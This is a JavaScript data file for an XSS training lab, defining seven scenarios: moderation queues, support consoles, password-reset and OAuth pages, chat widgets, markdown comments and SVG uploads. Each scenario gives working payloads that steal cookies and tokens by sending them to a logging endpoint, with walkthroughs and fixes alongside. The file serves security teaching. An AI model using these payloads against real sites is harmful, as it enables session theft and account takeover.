export const SCENARIOS = [
  {
    id: 'rw-blog-moderator',
    victim: { label: 'Moderator queue', path: '/lab/rw-blog-moderator/admin' },
    title: 'Blog comment queue: payload approved by the moderator',
    category: 'scenario',
    difficulty: 'practitioner',
    app: 'PixelPress',
    tags: ['stored', 'moderation workflow', 'real world'],
    summary: 'Comments are held for approval — and the queue itself renders them raw. Your payload fires in the moderator\'s session, then in public view.',
    scenario:
      'PixelPress runs a moderated comment section: readers submit, a moderator approves, and approved comments appear under the article. Two sinks exist. The queue renders the pending comment as HTML so moderators can see formatting, and the published view does the same. A comment that is "waiting for review" already runs in the moderator\'s browser — the approval step is theatre.',
    goal: 'Get a payload executed in the moderation queue, then observe it running in the published article view.',
    hints: [
      'Submit a comment with a normal tag like <b>bold</b>; the queue shows it formatted, so both views are HTML sinks.',
      'Comments are not published automatically — but the queue is enough. Open the moderator panel.',
      'Try a payload that works on load, not on hover: the moderator will not click anything for you.',
    ],
    payloads: [
      { label: 'Comment body', code: '<img src=x onerror=alert(document.domain)>' },
      {
        label: 'Exfiltrate the moderator session from the queue',
        code: "<img src=x onerror=\"fetch('/api/attack/log?lab=rw-blog-moderator&src=moderator&d='+encodeURIComponent(document.cookie))\">",
      },
      { label: 'Onclick variant (works after approval, when readers click)', code: '<a href="#" onclick="alert(document.domain)">great article</a>' },
    ],
    walkthrough: [
      { t: 'Comment normally', d: 'Post "nice write-up" and note the comment is pending. Nothing appears in the published list yet.' },
      { t: 'Check the queue renderer', d: 'Open the "Moderator queue" victim panel. Your pending comment is rendered there — with formatting, meaning innerHTML.' },
      { t: 'Plant the payload', d: 'Post the img payload as a new comment and reopen the queue. It fires in the moderator frame before anyone approves anything.' },
      { t: 'Approve it (optional)', d: 'Use the approve button in the queue and reload the article: the same payload now runs for every reader who loads the post.' },
      { t: 'Note the lesson', d: 'Moderation workflows concentrate risk: the people reviewing hostile content are the ones executing it. Previews must be sandboxed and sanitised too.' },
    ],
    why:
      'A "preview" or "review" screen is still a renderer. Approval queues, spam filters, report queues and AI-moderation dashboards all show untrusted content to privileged staff, and are frequently written later, by different people, without the encoder used on the public page.',
    fix: {
      text: 'Sanitise on input with an allow-list sanitiser AND encode on output everywhere, including moderation tools. Render previews in a sandboxed iframe with a CSP that blocks scripts.',
      code: "// store sanitised, render encoded\nconst clean = DOMPurify.sanitize(body, { ALLOWED_TAGS: ['b','i','em','strong','a','p','br'] });\n\n// both the queue and the article\n`<div class=\"comment\">${escapeHtml(clean)}</div>`",
    },
  },
  {
    id: 'rw-support-ticket',
    victim: { label: 'Agent console', path: '/lab/rw-support-ticket/admin' },
    title: 'SaaS support desk: the agent console',
    category: 'scenario',
    difficulty: 'practitioner',
    app: 'Nimbus Support',
    tags: ['stored', 'blind', 'agent console'],
    summary: 'Customers write tickets; agents read them in a console that renders the body as HTML. The customer\'s text becomes code in the agent\'s session.',
    scenario:
      'Nimbus is a SaaS product with a support inbox. Tickets carry a subject and a body, both written by the customer and both rendered in the agent console with innerHTML. Agents also have access to billing actions and internal notes on every account — which is exactly why the console is a target.',
    goal: 'Plant a ticket that executes when an agent opens it, and capture the agent session.',
    hints: [
      'Subject and body are separate fields — test both, they may be rendered by different code paths.',
      'The agent console loads a ticket when it is selected; the payload runs on load.',
      'Point the callback at /api/attack/log and check the attacker console.',
    ],
    payloads: [
      { label: 'Ticket body', code: '<img src=x onerror=alert("agent:"+document.cookie)>' },
      {
        label: 'Silent capture of the agent session',
        code: "<img src=x style=\"display:none\" onerror=\"fetch('/api/attack/log?lab=rw-support-ticket&src=agent&d='+encodeURIComponent(document.cookie))\">",
      },
      { label: 'Subject line variant (often unsanitised)', code: '<svg onload=alert(document.domain)>' },
    ],
    walkthrough: [
      { t: 'Open a ticket', d: 'Submit a ticket with a normal body. Then open the "Agent console" victim panel to see exactly what the agent sees.' },
      { t: 'Find the sink', d: 'The ticket body is rendered as HTML: <b>bold</b> works in the console.' },
      { t: 'Plant the payload', d: 'Submit a new ticket with the hidden img payload. Reopen the console and the payload reports the agent cookie to your console.' },
      { t: 'Describe impact', d: 'A support agent can usually read customer data and act on accounts. With a stolen session an attacker inherits that reach without touching a password.' },
    ],
    why:
      'Inbound text is always attacker-controlled, and the person reading it has more privilege than the person writing it. Any console that renders customer-supplied content as markup hands the attacker code execution in a privileged session.',
    fix: {
      text: 'Encode ticket fields at render time, sanitise rich-text bodies with an allow-list, keep session cookies HttpOnly, and set a CSP that blocks outbound requests from the console.',
      code: "// agent console\n<h2>${escapeHtml(ticket.subject)}</h2>\n<div class=\"body\">${DOMPurify.sanitize(ticket.body)}</div>",
    },
  },
  {
    id: 'rw-password-reset',
    title: 'Password reset page: reflected XSS to token theft',
    category: 'scenario',
    difficulty: 'practitioner',
    app: 'Greenleaf Store',
    tags: ['reflected', 'JavaScript context', 'account takeover', 'chain'],
    summary: 'The reset page echoes ?email= into an inline script and keeps the reset token in a JS variable. One quote and the token is yours.',
    scenario:
      'Greenleaf sends password-reset links of the form /reset?email=victim@example.com&token=abc123. The page greets the user with an inline script: var email = \'…\'; var token = \'…\'. The token is also in the URL, but the flow never verifies the two match, and the page writes the email parameter into JavaScript source. A link you send therefore runs code on the reset page — and code on that page can read the token.',
    goal: 'Break out of the JavaScript string and exfiltrate the reset token that the page is holding.',
    hints: [
      'You are inside a JavaScript string literal, not HTML. Quote characters are your escape characters.',
      'Look at what the page already has in scope: a token variable next to your injection point.',
      'The payload needs to comment out the rest of the statement — // does that.',
    ],
    payloads: [
      { label: 'Break the string and read the token', code: "';alert(document.domain)//" },
      {
        label: 'Full chain: send the token to the attacker console',
        code: "';fetch('/api/attack/log?lab=rw-password-reset&src=reset-token&d='+encodeURIComponent(document.getElementById('issued').textContent))//",
      },
      { label: 'What the server should have sent instead', code: "var email = \"victim\\u0040example.com\";  // JSON-encoded" },
    ],
    walkthrough: [
      { t: 'Read the page script', d: 'The reset page contains var email = \'<your input>\'; and var token = \'rt_…\'; — your value is JavaScript source, not text.' },
      { t: 'Escape it', d: 'Send `\';alert(document.domain)//` as the email. The script becomes var email = \'\';alert(document.domain)//\'; and runs immediately.' },
      { t: 'Steal the token', d: 'Swap the alert for the fetch payload. The console shows email plus the reset token the page was holding.' },
      { t: 'Complete the chain', d: 'With the token you can call the reset endpoint for that account. That is reflected XSS turning into account takeover — no password cracking needed.' },
      { t: 'Note the delivery', d: 'The attacker sends the crafted link to the victim, or embeds it where the victim will click. Because the payload is in the query string, every "share this page" path becomes a delivery mechanism.' },
    ],
    why:
      'Account-recovery flows are high value because they sit in front of authentication. Reflecting request data into JavaScript source is the most common server-side XSS in frameworks that still use inline scripts, and secrets placed in that same page become readable the moment the reflection is exploitable.',
    fix: {
      text: 'Never build JavaScript source from request data — JSON-encode or, better, put values in data attributes and read them with dataset. Deliver the token only to an authenticated session, bind it to the account, expire it quickly, and use a nonce-based CSP so inline injection cannot execute.',
      code: "// vulnerable\n<script>var email = '<?= $_GET['email'] ?>'; var token='<?= $token ?>';</script>\n\n// fixed: server renders data attributes, a static script reads them\n<div id=\"reset\" data-email=\"<?= e($_GET['email']) ?>\" data-token=\"<?= e($token) ?>\"></div>\n\n// plus CSP with a nonce\nContent-Security-Policy: script-src 'nonce-<random>'",
    },
  },
  {
    id: 'rw-oauth-state',
    title: 'OAuth popup: reflected XSS in the authorize page',
    category: 'scenario',
    difficulty: 'expert',
    app: 'Nimbus Cloud',
    tags: ['OAuth', 'state', 'document.write', 'token theft'],
    summary: 'The authorization server echoes the state parameter into a popup page with document.write. The access token is in the same document.',
    scenario:
      'Nimbus Cloud runs an OAuth 2.0 authorization server. /oauth/authorize renders a small landing page that auto-submits the consent decision, and it echoes the state parameter with document.write so the callback can restore it. An attacker who registers any client can send a crafted authorize URL; the victim sees a Nimbus-branded consent page, and the attacker\'s JavaScript runs on the identity provider\'s origin — where the token is minted.',
    goal: 'Execute JavaScript on the authorization page and show that the access token for the session is reachable.',
    hints: [
      'state is documented as an opaque callback value — but it is reflected into HTML here.',
      'The page writes a hidden form with your state value using document.write.',
      'The token is a page variable next to your injection; read it and POST it back to the console.',
    ],
    payloads: [
      { label: 'state value', code: '<img src=x onerror=alert(document.accessToken||document.cookie)>' },
      {
        label: 'Exfiltrate the token the page is about to issue',
        code: "<img src=x onerror=\"fetch('/api/attack/log?lab=rw-oauth-state&src=access-token&d='+encodeURIComponent(document.getElementById('issued').textContent))\">",
      },
      { label: 'Full crafted URL shape', code: '/lab/rw-oauth-state?client_id=attacker-app&redirect_uri=https://attacker.example/cb&state=<payload>' },
    ],
    walkthrough: [
      { t: 'See the popup', d: 'Open the lab: it renders the authorize page with the state printed back and the issued token displayed for the demo.' },
      { t: 'Inject through state', d: 'Put the img payload into the state parameter. document.write feeds it straight to the HTML parser, so it runs on the authorization origin.' },
      { t: 'Read the token', d: 'The demo exposes the issued token in an element with id="issued". Your payload reads it and sends it to your console — no OAuth policy was violated, the page simply executed your code.' },
      { t: 'Chain it', d: 'Send the crafted authorize URL to a victim. On consent, your script runs, grabs the token, and the attacker calls the API as the victim: classic OAuth XSS impact.' },
    ],
    why:
      'The authorization server is the most trusted origin in a deployment. XSS there bypasses token separation entirely, because code running on the IdP origin can read whatever the IdP has. OAuth parameters are attacker-controlled by design (state, redirect_uri, client_id, scope), which makes them prime injection vehicles.',
    fix: {
      text: 'Render parameters as text, never document.write. Bind the token to a code flow with PKCE, send tokens by redirect rather than documenting them, and add a strict CSP with nonces. Validate state as a base64url value with a length and charset limit.',
      code: "const state = new URLSearchParams(location.search).get('state') || '';\nif (!/^[A-Za-z0-9_-]{0,256}$/.test(state)) return renderError();\ndocument.getElementById('state').textContent = state;",
    },
  },
  {
    id: 'rw-chat-widget',
    title: 'Third-party chat widget: trusting every host',
    category: 'scenario',
    difficulty: 'expert',
    app: 'Nimbus Chat',
    tags: ['widget', 'postMessage', 'origin trust', 'embed'],
    summary: 'The widget accepts configuration messages from any parent frame and renders the brand field as HTML. Embedding partners can inject it.',
    scenario:
      'Nimbus Chat ships an embeddable widget: the host page positions it and sets branding by postMessage. The widget validates nothing — no origin allowlist, no schema check — and writes data.brand into its title with innerHTML. On a legitimate host that is fine. On a host the attacker controls, or through any page that can frame the widget, it is script execution inside the widget\'s context.',
    goal: 'Send a configuration message from the simulated host and get execution inside the widget.',
    hints: [
      'The widget listens for "message" events and never checks e.origin — the host is assumed to be friendly.',
      'The brand field is rendered with innerHTML in the widget\'s header.',
      'Use the message composer in the lab to post a config object.',
    ],
    payloads: [
      { label: 'Message payload', code: '{"type":"config","brand":"<img src=x onerror=alert(document.domain)>"}' },
      { label: 'What any page can send', code: "frame.contentWindow.postMessage({type:'config',brand:'<img src=x onerror=alert(1)>'}, '*')" },
    ],
    walkthrough: [
      { t: 'Look at the widget', d: 'The lab embeds the widget and sends a normal config. The brand name updates in the widget header.' },
      { t: 'Find the sink', d: 'The widget handler does title.innerHTML = data.brand. Any string is parsed as HTML.' },
      { t: 'Send the payload', d: 'Use the composer to send the img payload. The widget renders it and the handler fires inside the widget frame.' },
      { t: 'Explain the trust error', d: 'Widgets must treat the host as untrusted input: allowlist origins, validate the shape of every message, and render with textContent. Anything else means any site can drive your widget.' },
    ],
    why:
      'Third-party embeds invert the usual trust model. A widget runs on thousands of unknown origins, and its messages arrive from code you did not write. If it accepts commands from any parent and renders them as HTML, the widget becomes a self-service XSS for every partner.',
    fix: {
      text: 'Allowlist host origins, validate message schema, render with textContent, and add a CSP to the widget document. Also verify event.source matches the expected frame.',
      code: "const ALLOWED = new Set(['https://app.example.com', 'https://shop.example.com']);\naddEventListener('message', (e) => {\n  if (!ALLOWED.has(e.origin)) return;\n  if (e.data?.type !== 'config' || typeof e.data.brand !== 'string') return;\n  title.textContent = e.data.brand.slice(0, 40);\n});",
    },
  },
  {
    id: 'rw-markdown',
    title: 'Markdown comment renderer that allows raw HTML',
    category: 'scenario',
    difficulty: 'practitioner',
    app: 'PixelPress',
    tags: ['markdown', 'raw HTML', 'link schemes'],
    summary: 'Markdown is not a sanitiser. This renderer passes HTML through and never validates link schemes, giving you two routes to execution.',
    scenario:
      'PixelPress lets readers use markdown in comments. The renderer converts **bold**, *italic*, `code` and [links](url) — and it passes raw HTML straight through, as many markdown libraries do by default. Link targets are not scheme-checked either. Authors of "safe" comment systems regularly get this wrong because markdown feels like a restricted format.',
    goal: 'Get execution through the markdown renderer — once with raw HTML, once through a link.',
    hints: [
      'Try raw HTML inside a markdown comment; most converters allow it unless configured otherwise.',
      'The link converter does not validate the scheme: [text](javascript:…) becomes an anchor with a javascript href.',
      'If a link needs a click, remember the payload still has to be triggered by the reader.',
    ],
    payloads: [
      { label: 'Raw HTML passthrough', code: '<img src=x onerror=alert(document.domain)>' },
      { label: 'Link scheme injection (fires on click)', code: '[Click for your prize](javascript:alert(document.domain))' },
      { label: 'Exfiltration via raw HTML', code: "<img src=x onerror=\"fetch('/api/attack/log?lab=rw-markdown&src=markdown&d='+encodeURIComponent(document.cookie))\">" },
    ],
    walkthrough: [
      { t: 'Post markdown', d: 'Submit **bold** and a [link](https://example.com). The output is HTML — the renderer builds markup from your text.' },
      { t: 'Test raw HTML', d: 'Submit <img src=x onerror=alert(document.domain)> directly. It fires: the converter did not escape HTML.' },
      { t: 'Test the link path', d: 'Submit [click](javascript:alert(document.domain)). The anchor gets a javascript: href because the scheme is not validated. Clicking it executes.' },
      { t: 'Fix it properly', d: 'Do not escape the markdown output — that would print markup. Run the rendered HTML through an allow-list sanitiser, and validate link schemes against http/https/mailto.' },
    ],
    why:
      'Markdown is a superset of plain text with an HTML escape hatch. Converting markdown produces HTML, so the result must be treated as untrusted HTML. Renderers that skip sanitisation or forget href scheme checks hand attackers the same sinks as any other HTML injection.',
    fix: {
      text: 'Render markdown, then sanitise the HTML output with an allow-list, then validate every link. Disable raw HTML in the markdown config if the product does not need it.',
      code: "import { marked } from 'marked';\nimport DOMPurify from 'dompurify';\n\nconst html = DOMPurify.sanitize(marked.parse(md), {\n  ALLOWED_TAGS: ['p','b','i','em','strong','code','pre','a','ul','ol','li','br'],\n  ALLOWED_ATTR: ['href'],\n});\n\n// and at render time, only http(s)/mailto links survive\nel.querySelectorAll('a').forEach((a) => {\n  if (!/^(https?:|mailto:)/.test(a.getAttribute('href') || '')) a.removeAttribute('href');\n});",
    },
  },
  {
    id: 'rw-svg-upload',
    title: 'Image upload: an SVG is a document, not a picture',
    category: 'scenario',
    difficulty: 'practitioner',
    app: 'Nimbus Docs',
    tags: ['file upload', 'SVG', 'content type', 'stored'],
    summary: 'Avatars accept SVG. The file is served from the app origin as image/svg+xml, so the SVG\'s own script runs on that origin.',
    scenario:
      'Nimbus Docs lets you upload an avatar and accepts "images", including SVG, which is convenient for crisp logos. The upload is stored and served from the same origin with Content-Type: image/svg+xml. SVG is an XML document format that supports <script>; served from your origin, it is a stored XSS with the same privileges as any page on the host. This lab stores the SVG text and serves it back from the lab origin.',
    goal: 'Upload an SVG containing script, open it from the file list, and show that it executes.',
    hints: [
      'SVG files can contain <script> and event handlers — they are not raster images.',
      'The uploaded file is served with its own content type, so the browser treats it as a document when opened directly.',
      'Open the uploaded file from the file list to run it. Use the console endpoint as proof.',
    ],
    payloads: [
      { label: 'avatar.svg', code: '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="80">\n  <text y="20">loading…</text>\n  <script>alert(document.domain)</script>\n</svg>' },
      { label: 'Exfiltration variant', code: '<svg xmlns="http://www.w3.org/2000/svg">\n  <script>fetch(\'/api/attack/log?lab=rw-svg-upload&src=svg&d=\'+encodeURIComponent(document.cookie))</script>\n</svg>' },
      { label: 'Handler-only variant (no script tag)', code: '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>' },
    ],
    walkthrough: [
      { t: 'Upload the SVG', d: 'Paste the first payload into the upload form as avatar.svg and save it.' },
      { t: 'Open it', d: 'Click the uploaded file in the list. The browser navigates to it and, because the content type is image/svg+xml, parses it as a document — the script executes.' },
      { t: 'Check the console', d: 'With the exfiltration variant the attacker console records the hit. In a real app the cookie would carry a live session.' },
      { t: 'Fix it', d: 'Serve user files from a separate origin (or a signed CDN domain) with Content-Disposition: attachment, X-Content-Type-Options: nosniff, and a CSP of default-src \'none\'. Re-encode raster images instead of storing them verbatim, and reject SVG unless you sanitise it.' },
    ],
    why:
      'Serving user-controlled files from your own origin turns file upload into stored XSS: SVG (and HTML, and some XML types) are documents with script support. The same risk appears with PDFs on some browsers, with uploaded .html, and with any file type the browser sniffs as a document.',
    fix: {
      text: 'Isolate uploads on a separate domain, force download, disable sniffing, and never serve user content with a script-capable content type from the app origin.',
      code: "Content-Type: image/svg+xml\nContent-Disposition: attachment; filename=\"avatar.svg\"\nX-Content-Type-Options: nosniff\nContent-Security-Policy: default-src 'none'; sandbox\n\n# better: serve from https://files.example-cdn.com with a signed URL",
    },
  },
];
